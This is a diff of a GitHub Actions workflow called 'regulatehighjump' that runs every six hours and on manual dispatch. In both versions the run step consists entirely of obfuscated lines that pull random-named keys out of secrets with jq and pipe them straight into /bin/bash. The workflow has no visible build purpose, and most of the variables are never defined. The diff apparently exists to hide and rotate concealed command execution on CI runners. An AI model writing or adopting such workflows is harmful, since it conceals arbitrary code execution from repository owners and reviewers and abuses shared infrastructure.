@@ -1,26 +1,27 @@
 name: regulatehighjump
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 0/6 * * *'
-
+    - cron: '21 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: regulatehighjump
         env:
-          os076: ${{ secrets.os076 }}
+          fzte34099: ${{ secrets.fzte34099 }}
         run: |
-          echo $os076 | jq -r .iiav25 | /bin/bash
-          echo $gd08886 | jq -r .wl07 | /bin/bash
-          echo $roxe0 | jq -r .svmyz40210 | /bin/bash
-          echo $yty314 | jq -r .thzs5522 | /bin/bash
-          echo $evp9 | jq -r .l4166 | /bin/bash
-          echo $qyxe7 | jq -r .f787 | /bin/bash
-          echo $x91 | jq -r .w878 | /bin/bash
-          echo $vompf30 | jq -r .r2589 | /bin/bash
-          echo $qtgm62 | jq -r .m1133 | /bin/bash
+          echo $fzte34099 | jq -r .qpoxg58832 | /bin/bash
+          echo $dhtx2 | jq -r .pbif3 | /bin/bash
+          echo $quxq42 | jq -r .teok23868 | /bin/bash
+          echo $pahf66 | jq -r .axpbp5659 | /bin/bash
+          echo $pcm37 | jq -r .ixzwr347 | /bin/bash
+          echo $fp9 | jq -r .okyqv335 | /bin/bash
+          echo $g5223 | jq -r .hd94726 | /bin/bash
+          echo $dmpm0822 | jq -r .w206 | /bin/bash
+          echo $l2 | jq -r .bzvmq5 | /bin/bash
+          echo $pv039 | jq -r .jrzne0 | /bin/bash
+          echo $p1694 | jq -r .awrwx992 | /bin/bash
 
